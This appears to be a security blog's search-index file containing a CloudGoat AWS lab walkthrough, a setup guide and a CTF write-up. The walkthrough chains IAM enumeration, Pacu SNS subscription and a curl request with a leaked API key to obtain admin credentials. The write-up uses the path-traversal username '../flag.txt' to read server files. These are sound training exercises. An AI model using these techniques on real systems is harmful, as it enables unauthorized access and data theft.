<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CloudGoat scenario 01 - sns_secrets (AWS, Pacu)</title>
      <link href="/250306-cloudgoat-scenario01-sns_secrets/"/>
      <url>/250306-cloudgoat-scenario01-sns_secrets/</url>
      
        <content type="html"><![CDATA[<h2 id="sns-secrets-Small-x2F-Easy"><a href="#sns-secrets-Small-x2F-Easy" class="headerlink" title="sns_secrets (Small &#x2F; Easy)"></a>sns_secrets (Small &#x2F; Easy)</h2><ul><li><a href="https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/sns_secrets">https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/sns_secrets</a></li></ul><p>In this scenario, you are given AWS credentials. Your task is to enumerate permissions and discover that you have the ability to list and subscribe to <code>SNS</code> topics. Use Pacu‚Äôs new modules, ‚Äúsns__enum‚Äù and ‚Äúsns__subscribe,‚Äù to subscribe to the topic. You will receive an email from the topic containing an API Key as a debug message. Next, use the AWS CLI to enumerate the API Gateways and find the path, method, stage, and resource of the API Gateway. Finally, perform a curl request with the API key to retrieve the final flag.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudgoat.py create sns_secrets</span><br></pre></td></tr></table></figure><p>If you run above command, then you‚Äôll get below information.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[cloudgoat] terraform output completed with no error code.</span><br><span class="line">sns_user_access_key_id =</span><br><span class="line">sns_user_secret_access_key =</span><br><span class="line"></span><br><span class="line">[cloudgoat] Output file written to:</span><br><span class="line"></span><br><span class="line">    /Users/user/CloudGoat/sns_secrets_cgidjt7xmtxtc7/start.txt</span><br></pre></td></tr></table></figure><h3 id="AWS-SNS-Simple-Notification-Service"><a href="#AWS-SNS-Simple-Notification-Service" class="headerlink" title="AWS SNS (Simple Notification Service)"></a>AWS SNS (Simple Notification Service)</h3><p>A messaging service that allows creating topics and sending messages to subscribed recipients. In this challenge, you need to list SNS topics, subscribe to one, and receive an API key via email.</p><h3 id="IAM-Identity-and-Access-Management"><a href="#IAM-Identity-and-Access-Management" class="headerlink" title="IAM (Identity and Access Management)"></a>IAM (Identity and Access Management)</h3><p>A service that manages user access permissions in AWS. It allows companies to assign detailed permissions to different teams and users based on their roles. For example, the development team can be granted access to EC2 and S3, while the database management team gets access to RDS. Like most access control systems, a root account manages everything, while other users receive individual accounts with limited permissions.</p><p>In this challange, you need to enumerate your permissions using the provided AWS credentials and check if you can list and subscribe to SNS topics.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ aws configure --profile sns-secrets</span><br><span class="line">AWS Access Key ID [None]:</span><br><span class="line">AWS Secret Access Key [None]:</span><br><span class="line">Default region name [None]:</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure><p>If you enter the credentials obtained from the challenge, you can check your identity, similar to using the <code>whoami</code> command, with the following command.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ aws sts get-caller-identity --profile sns-secrets</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserId&quot;</span>: <span class="string">&quot;AIDAUZPNLFOKXJXG77CFY&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Account&quot;</span>: <span class="string">&quot;329599626133&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Arn&quot;</span>: <span class="string">&quot;arn:aws:iam::329599626133:user/cg-sns-user-sns_secrets_cgidjt7xmtxtc7&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-Enumeration-IAM-user‚Äôs-permissions-using-the-AWS-CLI"><a href="#1-Enumeration-IAM-user‚Äôs-permissions-using-the-AWS-CLI" class="headerlink" title="1. Enumeration IAM user‚Äôs permissions using the AWS CLI"></a>1. Enumeration IAM user‚Äôs permissions using the AWS CLI</h3><p>We will use the unique <code>ARN(Amazon Resouce Name)</code> obtained from the challenge profile to enumerate policies.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ aws iam list-user-policies --user-name cg-sns-user-sns_secrets_cgidjt7xmtxtc7 --profile sns-secrets</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;PolicyNames&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;cg-sns-user-policy-sns_secrets_cgidjt7xmtxtc7&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now that we have retrieved the specific policy information, let‚Äôs examine its details.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ aws iam get-user-policy --user-name cg-sns-user-sns_secrets_cgidjt7xmtxtc7 --policy-name cg-sns-user-policy-sns_secrets_cgidjt7xmtxtc7 --profile sns-secrets</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;cg-sns-user-sns_secrets_cgidjt7xmtxtc7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PolicyName&quot;</span>: <span class="string">&quot;cg-sns-user-policy-sns_secrets_cgidjt7xmtxtc7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;PolicyDocument&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Version&quot;</span>: <span class="string">&quot;2012-10-17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Statement&quot;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;sns:Subscribe&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:Receive&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:ListSubscriptionsByTopic&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:ListTopics&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;sns:GetTopicAttributes&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:ListGroupsForUser&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:ListUserPolicies&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:GetUserPolicy&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;iam:ListAttachedUserPolicies&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;apigateway:GET&quot;</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Allow&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&quot;Action&quot;</span>: <span class="string">&quot;apigateway:GET&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Effect&quot;</span>: <span class="string">&quot;Deny&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Resource&quot;</span>: [</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/apikeys&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/apikeys/*&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/methods/GET&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/integration&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration&quot;</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To briefly explain how AWS SNS works, A publisher sends messages to an SNS topic such as <code>server-alerts</code>. These messages are delievered to subscribers through email or SMS.</p><p>(Publisher) ‚Äì&gt; (SNS Topic) ‚Äì&gt; (Subscriber)</p><p>Above IAM policy provided to the user allows the <code>sns:Subscribe</code> permission on all SNS topics. The key issue here is <code>&quot;Resource&quot;: &quot;*&quot;</code>. This permission grants the user the ability to subscribe to any topic. This is a critical vulnerability because it allows unauthorized users to subscribe to potentially sensitive topics.</p><p>Next, the policy also allows the <code>&quot;apigateway:GET&quot;</code>. This permission grants to make GET requests to API Gateway resources. The user will need an <code>API Key</code> to authenticate and successfully interact with the API. Now, How can I get the <code>API Key</code>?</p><h3 id="2-Subscribing-to-an-SNS-Topic-using-Pacu"><a href="#2-Subscribing-to-an-SNS-Topic-using-Pacu" class="headerlink" title="2. Subscribing to an SNS Topic using Pacu"></a>2. Subscribing to an SNS Topic using Pacu</h3><ul><li><a href="https://github.com/RhinoSecurityLabs/pacu">https://github.com/RhinoSecurityLabs/pacu</a></li></ul><p>We use <code>Pacu</code> which is an open-source AWS exploitation framework. With <code>Pacu</code>, we can enumerate SNS topics and subscribe to them. And also we can enumerate our IAM permissions using <code>Pacu</code> as shown below. First, create a new session and enter below command then it will import AWS Keys from the AWS CLI credentials file (~&#x2F;.aws&#x2F;credentials).</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:No Keys Set) &gt; import_keys sns-secrets</span><br></pre></td></tr></table></figure><p>There are two modules related to SNS. These modules are based on IAM profile, it means this profile(<code>sns-secrets</code>) can use only these modules when it comes to <code>SNS</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:imported-sns-secrets) &gt; search sns</span><br><span class="line">[Category: ENUM]</span><br><span class="line"></span><br><span class="line">    List and describe Simple Notification Service topics</span><br><span class="line"></span><br><span class="line">  sns__enum</span><br><span class="line"></span><br><span class="line">[Category: LATERAL_MOVE]</span><br><span class="line"></span><br><span class="line">    Subscribe to a Simple Notification Service (SNS) topic</span><br><span class="line"></span><br><span class="line">  sns__subscribe</span><br></pre></td></tr></table></figure><p><code>sns-secrets</code> profile has the <code>sns:ListTopics</code> permission, so you can use the <code>sns__enum</code> module. Additionally, this profile has the <code>sns:Subscribe</code> permission, allowing you to use the <code>sns__subscribe</code> module.</p><p>You can use the <code>help</code> command to get more information about how to use each SNS-related module (<code>sns__enum</code>, <code>sns__subscribe</code>):</p><ul><li><code>sns__enum</code>: Lists and describes SNS topics. It‚Äôs used to enumerate the existing SNS topics in an AWS.</li><li><code>sns__subscribe</code>: Subscribes to a specific SNS topic. And also it allows to receive a subscription confirmation.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:imported-sns-secrets) &gt; run sns__enum --region us-east-1</span><br></pre></td></tr></table></figure><p>You can check the unique <code>ARN(Amazon Resouce Name)</code>. In AWS, each resources(e.g EC2, S3, SNS Topic ..) have unique ARN.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pacu (sns-secrets:imported-sns-secrets) &gt; run sns__subscribe --topics [TopicARN] --email [Email]</span><br></pre></td></tr></table></figure><p>After running this command, you can confirm the subscription via email. Once you confirm the SNS Topic subscription, you will receive an <code>API Key</code> for the <code>API Gateway</code> via email. As I mentioned before, this can be a vulnerability. You can send a GET request to the <code>API Gateway</code> using this <code>API Key</code>.</p><p>But why will you get the <code>API Key</code>? This is likely due to a developer‚Äôs mistake. Or the <code>sns:Subscribe</code> permission is too broadly configured, allowing users who shouldn‚Äôt have access to receive messages.</p><img src="/images/250306-cloudgoat-scenario01-sns_secrets/1.png" width=400/><br><p>In this challenge, It says <code>DEBUG</code> in the email, so it is definitely not for a normal user.</p><h3 id="3-Accessing-the-API-Gateway-and-Get-a-Flag"><a href="#3-Accessing-the-API-Gateway-and-Get-a-Flag" class="headerlink" title="3. Accessing the API Gateway and Get a Flag"></a>3. Accessing the API Gateway and Get a Flag</h3><p>After getting an <code>API Key</code> for the <code>API Gateway</code>, we can enumerate the available APIs, stages, and resources using <code>AWS CLI</code>. First, we list the API Gateway resources associated with the <code>sns-secrets</code> profile.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws apigateway get-rest-apis --profile sns-secrets --region us-east-1</span><br></pre></td></tr></table></figure><p>The output shows an API named <code>cg-api-sns_secrets_cgidjt7xmtxtc7</code> and ID is <code>43u8hxyd16</code>. We will check available deployment stages using this ID.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ aws apigateway get-stages --rest-api-id 43u8hxyd16 --profile sns-secrets --region us-east-1</span><br></pre></td></tr></table></figure><p>The <code>prod-sns_secrets_cgidjt7xmtxtc7</code> stage is active. It means API requests can be sent to this endpoint.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ aws apigateway get-resources --rest-api-id 43u8hxyd16 --profile sns-secrets --region us-east-1</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;items&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;7exe56i0y5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;tox00r&quot;</span>,</span><br><span class="line">            <span class="string">&quot;parentId&quot;</span>: <span class="string">&quot;7exe56i0y5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pathPart&quot;</span>: <span class="string">&quot;user-data&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/user-data&quot;</span>,</span><br><span class="line">            <span class="string">&quot;resourceMethods&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;GET&quot;</span>: &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>/user-data</code> resource supports GET requests. It means we can attempt to access and get user data through this path.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://[API-ID].execute-api.us-east-1.amazonaws.com/[stageName]/[resourcePath]</span><br></pre></td></tr></table></figure><p>Since we already got the <code>API Key</code>, we can now send a GET request to the <code>API Gateway</code> endpoint (<code>/user-data</code>) like this!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET \</span><br><span class="line"><span class="string">&#x27;https://43u8hxyd16.execute-api.us-east-1.amazonaws.com/prod-sns_secrets_cgidjt7xmtxtc7/user-data&#x27;</span> \</span><br><span class="line">-H <span class="string">&#x27;x-api-key: 45a3da610dc64703b10e273a4db135bf&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;final_flag&quot;</span>: <span class="string">&quot;FLAG&#123;***&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Access granted&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user_data&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;SuperAdmin@notarealemail.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;p@ssw0rd123&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_id&quot;</span>: <span class="string">&quot;1337&quot;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;SuperAdmin&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Finally we got a <code>flag</code> and <code>SuperAdmin</code> account. This challenge shows how important it is to properly manage permissions and secure sensitive information in AWS.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./cloudgoat.py destroy sns_secrets</span><br></pre></td></tr></table></figure><p>And.. don‚Äôt forget destroy the deployed resources!!</p>]]></content>
      
      
      <categories>
          
          <category> AWS </category>
          
          <category> CloudGoat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloud </tag>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
            <tag> Pacu </tag>
            
            <tag> IAM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CloudGoat 00. Setup (AWS)</title>
      <link href="/250305-cloudgoat-start/"/>
      <url>/250305-cloudgoat-start/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/RhinoSecurityLabs/cloudgoat">https://github.com/RhinoSecurityLabs/cloudgoat</a></li></ul><p>I tried CloudGoat a few years ago, but I barely remember and they‚Äôve added more challenges, so I want to try it again and explore the new scenarios.</p><p>CloudGoat is a ‚ÄúVulnerable by Design‚Äù AWS deployment tool created by Rhino Security Labs, designed to help users develop cloud cybersecurity skills. It offers a series of ‚Äúcapture-the-flag‚Äù style scenarios, allowing you to explore vulnerabilities and exploit them to achieve the scenario‚Äôs objectives.</p><h2 id="Let‚Äôs-get-started"><a href="#Let‚Äôs-get-started" class="headerlink" title="Let‚Äôs get started!"></a>Let‚Äôs get started!</h2><h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><ol><li>Linux or MacOS. Windows is not officially supported.</li></ol><ul><li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li></ul><ol start="2"><li>Python3.6+ is required.</li><li>Terraform &gt;&#x3D; 0.14 installed and in your <code>$PATH</code>.</li><li>The AWS CLI installed and in your <code>$PATH</code>, and an AWS account with sufficient privileges to create and destroy resources.</li><li>jq (JSON processor)</li></ol><p>I will be setting up CloudGoat on <code>macOS</code>.</p><h3 id="1-Install-AWS-CLI"><a href="#1-Install-AWS-CLI" class="headerlink" title="1. Install AWS CLI"></a>1. Install AWS CLI</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install awscli</span><br></pre></td></tr></table></figure><h3 id="2-Set-Up-AWS-Profile"><a href="#2-Set-Up-AWS-Profile" class="headerlink" title="2. Set Up AWS Profile"></a>2. Set Up AWS Profile</h3><p>Before running CloudGoat, create an IAM user in AWS with the required permissions <code>AdministratorAccess</code> and configure your AWS credentials. I named this user <code>cloudgoat</code>. Before executing below command, you need to get the <code>Access Key</code> and <code>Secret Access Key</code> from the AWS website. And please save these keys somewhere safe, and never share your <code>Secret Access Key</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile cloudgoat</span><br></pre></td></tr></table></figure><p>To check, if your credentials are configured correctly, run:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile cloudgoat</span><br></pre></td></tr></table></figure><h3 id="3-Install-Terraform"><a href="#3-Install-Terraform" class="headerlink" title="3. Install Terraform"></a>3. Install Terraform</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew tap hashicorp/tap</span><br><span class="line">brew install hashicorp/tap/terraform</span><br></pre></td></tr></table></figure><h3 id="4-Set-Up-CloudGoat"><a href="#4-Set-Up-CloudGoat" class="headerlink" title="4. Set Up CloudGoat"></a>4. Set Up CloudGoat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/RhinoSecurityLabs/cloudgoat.git</span><br><span class="line"><span class="built_in">cd</span> cloudgoat</span><br><span class="line">python3 -m venv .venv</span><br><span class="line"><span class="built_in">source</span> .venv/bin/activate</span><br><span class="line">pip3 install -r ./requirements.txt</span><br><span class="line"><span class="built_in">chmod</span> +x cloudgoat.py</span><br><span class="line"></span><br><span class="line">./cloudgoat.py config profile</span><br><span class="line">./cloudgoat.py config whitelist --auto</span><br></pre></td></tr></table></figure><h3 id="Deloy-a-Scenario"><a href="#Deloy-a-Scenario" class="headerlink" title="(+) Deloy a Scenario"></a>(+) Deloy a Scenario</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudgoat.py create sns_secrets</span><br></pre></td></tr></table></figure><p>To deploy the <code>sns_secrets</code> scenario, use above command.</p><h3 id="Cleanup-a-Scenario"><a href="#Cleanup-a-Scenario" class="headerlink" title="(+) Cleanup a Scenario"></a>(+) Cleanup a Scenario</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cloudgoat.py destroy sns_secrets</span><br></pre></td></tr></table></figure><p>After finishing a scenario, always destroy the deployed resources to avoid unnecessary costs.</p>]]></content>
      
      
      <categories>
          
          <category> AWS </category>
          
          <category> CloudGoat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloud </tag>
            
            <tag> AWS </tag>
            
            <tag> CloudGoat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWS CLI commands (last modified 2025-03-05)</title>
      <link href="/250305-aws-awscli-command/"/>
      <url>/250305-aws-awscli-command/</url>
      
        <content type="html"><![CDATA[<p>(This document will be updated regularly)</p><p>smillar to <code>whoami</code>. You can check the information of the currently logged-in IAM user.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile cloudgoat</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> AWS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloud </tag>
            
            <tag> AWS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnMe CTF CTF Quals 2025 - ProfileEditor (WEB)</title>
      <link href="/250304-pwnmectf2025-profileeditor/"/>
      <url>/250304-pwnmectf2025-profileeditor/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2658">https://ctftime.org/event/2658</a></li></ul><p>I couldn‚Äôt get the remote flag because I solved it from local after the CTF ended. However, I solved it correctly and got the local flag, so I‚Äôm sharing how to access and solve it.</p><p>The challenge provided the full source code, making it a white-box web challenge written in Python using Flask.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>There were 4 endpoints:</p><ul><li><code>/login</code>: Logs in with a username and password, creating a session.</li><li><code>/register</code>: Creates an account with a username and password.</li><li><code>/profile</code>: Allows users to view and edit their profile.</li><li><code>/show_profile</code>: Displays the profile without allowing edits.</li></ul><p>The most interesting endpoint was <code>/show_profile</code>, as it read the profile directly from a file. Since there was a <code>flag.txt</code> file on the server, I wanted to exploit it to read the flag using the <code>/show_profile</code> endpoint.</p><p>I didn‚Äôt use <code>/profile</code> because, even though it also reads profile files, it appends <code>.html</code> to the username when reading the file. So, if my username were <code>flag.txt</code>, it would attempt to read <code>flag.txt.html</code> instead. You can see this behavior in the implementation below:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">profiles_file = <span class="string">&#x27;profile/&#x27;</span> + session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">profiles_file = profiles_file <span class="keyword">if</span> profiles_file.endswith(<span class="string">&#x27;.html&#x27;</span>) <span class="keyword">else</span> profiles_file + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line"></span><br><span class="line">profile=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> exists(profiles_file):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(profiles_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        profile = f.read()</span><br></pre></td></tr></table></figure><p>Now, let‚Äôs take a look at <code>/show_profile</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show_profile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    profiles_file = <span class="string">&#x27;profile/&#x27;</span> + session.get(<span class="string">&#x27;username&#x27;</span>) <span class="comment"># [1]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> commonpath((app.root_path, abspath(profiles_file))) != app.root_path:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>, msg=<span class="string">&#x27;Error processing profile file!&#x27;</span>, return_to=<span class="string">&#x27;/profile&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    profile = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> exists(profiles_file): <span class="comment"># [2]</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(profiles_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            profile = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;show_profile.html&#x27;</span>, username=session.get(<span class="string">&#x27;username&#x27;</span>), profile=profile)</span><br></pre></td></tr></table></figure><p>Since the file it reads depends on the username, if the file exists, you can read it. However, as seen in [1], <code>profiles_file</code> is formatted as <code>profile/username</code>, meaning you need to use <code>../</code> to climb up directories. Since <code>flag.txt</code> is not in the <code>profile</code> directory. This is known as <code>Path Traversal</code>.</p><h2 id="Solution-Summary"><a href="#Solution-Summary" class="headerlink" title="Solution Summary"></a>Solution Summary</h2><ol><li>Register and Log in with the username <code>../flag.txt</code>.</li><li>Access <code>/show_profile</code>, and it will display the contens of <code>flag.txt</code>.</li></ol>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
